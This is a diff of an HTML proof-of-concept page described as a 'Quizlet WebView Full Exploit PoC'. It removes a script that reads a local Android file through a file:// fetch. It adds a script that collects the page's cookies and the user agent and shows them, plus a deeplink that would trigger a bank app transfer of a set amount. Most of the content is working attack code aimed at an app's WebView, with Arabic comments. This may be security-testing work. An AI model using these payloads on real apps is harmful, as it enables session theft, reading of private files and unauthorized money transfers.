@@ -1,12 +1,39 @@
 <html>
-  <body>
-    <h1>File Access PoC</h1>
-    <script>
-      // Try to read a local file (e.g., /sdcard/Download/test.txt)
-      fetch('file:///sdcard/Download/test.txt')
-        .then(r => r.text())
-        .then(t => alert('File contents: ' + t))
-        .catch(e => alert('Error: ' + e));
-    </script>
-  </body>
+<body>
+  <h1>Quizlet WebView Full Exploit PoC</h1>
+  <p><a href="deeplink://com.bank.app/transfer?amount=1000">Click here to open bank app</a></p>
+
+  <div id="results" style="border: 2px solid #333; padding: 10px; margin-top: 20px; font-family: monospace; word-wrap: break-word;">
+    <h2>البيانات المجمّعة:</h2>
+  </div>
+
+  <script>
+    // 1. الحصول على الكوكيز
+    const cookies = document.cookie;
+
+    // 2. الحصول على بصمة المتصفح (User Agent)
+    const userAgent = navigator.userAgent;
+
+    // الحصول على العنصر الذي سنطبع فيه النتائج
+    const resultsDiv = document.getElementById('results');
+
+    // إنشاء عناصر HTML لعرض البيانات
+    const cookiesElement = document.createElement('p');
+    cookiesElement.innerHTML = '<strong>ملفات تعريف الارتباط (Cookies):</strong> ' + cookies;
+
+    const userAgentElement = document.createElement('p');
+    userAgentElement.innerHTML = '<strong>معرّف العميل (User Agent):</strong> ' + userAgent;
+
+    // إضافة البيانات إلى الصفحة
+    resultsDiv.appendChild(cookiesElement);
+    resultsDiv.appendChild(userAgentElement);
+
+    // تم تعطيل إعادة التوجيه لعرض البيانات
+    /*
+    setTimeout(() => {
+      location.href = 'vnd.youtube://channel/UC_x5XG1OV2P6uZZ5FSM9Ttw';
+    }, 2000);
+    */
+  </script>
+</body>
 </html>
